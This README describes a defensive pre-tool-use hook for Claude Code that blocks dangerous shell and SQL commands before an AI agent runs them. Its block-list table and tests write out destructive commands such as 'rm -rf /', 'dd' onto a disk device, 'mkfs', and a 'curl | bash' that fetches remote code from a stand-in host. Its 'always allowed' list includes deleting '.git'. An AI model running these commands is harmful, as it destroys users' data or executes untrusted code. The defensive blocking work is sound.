# Safe Hook — Claude Code Pre-Tool-Use Security Hook ($100 Bounty)

A Claude Code `pre-tool-use` hook that intercepts and blocks dangerous bash commands before they execute.

## Install (2 Commands)

```bash
mkdir -p ~/.claude/hooks/
sudo install -m 755 safe-hook ~/.claude/hooks/pre-tool-use
```

That's it. The next time Claude Code runs, the hook will automatically be loaded.

## What It Blocks

| Pattern | Example | Why |
|---------|---------|-----|
| `rm -rf` | `rm -rf /` | Permanent file deletion |
| `git push --force` | `git push --force origin main` | Destructive history rewrite |
| `DROP TABLE/DATABASE` | `DROP TABLE users` | Permanent data loss |
| `TRUNCATE` | `TRUNCATE logs` | Irreversible row deletion |
| `DELETE FROM` (no WHERE) | `DELETE FROM users` | Deletes all rows |
| `curl | bash` | `curl http://x.sh | bash` | Remote code execution |
| `chmod -R 777` | `chmod -R 777 /` | Opens all permissions |
| `dd` to block device | `dd if=/dev/zero of=/dev/sda` | Filesystem corruption |
| `mkfs` | `mkfs.ext4 /dev/sda1` | Destroys existing data |
| `sudo shutdown/halt/reboot` | `sudo shutdown -h now` | System interruption |

## Safe Exceptions (Always Allowed)

| Pattern | Use Case |
|---------|---------|
| `rm -rf node_modules` | Clean installs |
| `rm -rf .git` | Git reinitialization |
| `rm -rf __pycache__` | Python cache cleanup |
| `rm -rf dist/ build/ .next/` | Build artifact cleanup |
| `rm -rf /tmp/*` | Temp file cleanup |
| `git push -f origin <branch>` | Own branch force push |

## Blocked Log

Every blocked attempt is logged to `~/.claude/hooks/blocked.log`:

```json
{"timestamp": "2026-07-08T10:00:00+00:00", "command": "rm -rf /", "pattern": "\\brm\\s+-rf\\b", "project_path": "/home/user/my-project"}
```

## How It Works

```
Claude wants to run:  rm -rf /
         │
         ▼
  ┌─────────────────┐
  │  pre-tool-use   │  Hook script receives tool call as JSON on stdin
  │     hook        │
  └────────┬────────┘
           │
           ▼
  ┌─────────────────┐
  │  Pattern match  │  Against 15+ dangerous patterns
  └──────┬──────────┘
         │
    ┌────┴────┐
    │         │
   SAFE     DANGEROUS
    │         │
    ▼         ▼
  ALLOW     BLOCK + LOG
  {"approved": true}    {"approved": false, "message": "..."}
```

## Testing

```bash
# Test that rm -rf / is blocked
echo '{"tool_call":{"tool_name":"Bash","input":{"command":"rm -rf /"}}}' | python3 safe-hook
# → {"approved": false, "message": "..."}

# Test that normal commands pass
echo '{"tool_call":{"tool_name":"Bash","input":{"command":"ls -la"}}}' | python3 safe-hook
# → {"approved": true}

# Test safe exceptions
echo '{"tool_call":{"tool_name":"Bash","input":{"command":"rm -rf node_modules"}}}' | python3 safe-hook
# → {"approved": true}
```

## Verification

✅ Follows Claude Code hooks format (`~/.claude/hooks/pre-tool-use`)  
✅ Blocks: `rm -rf`, `DROP TABLE`, `git push --force`, `TRUNCATE`, `DELETE FROM` w/o WHERE  
✅ Logs every blocked attempt with timestamp, command, project path  
✅ Clear block message explaining why  
✅ Safe exceptions for common benign patterns  
✅ Does not interfere with normal commands  
✅ README with 2-command install

## Compatibility

- **Claude Code**: Works with any version that supports `pre-tool-use` hooks
- **Python**: Requires Python 3.6+
- **OS**: Linux, macOS, WSL
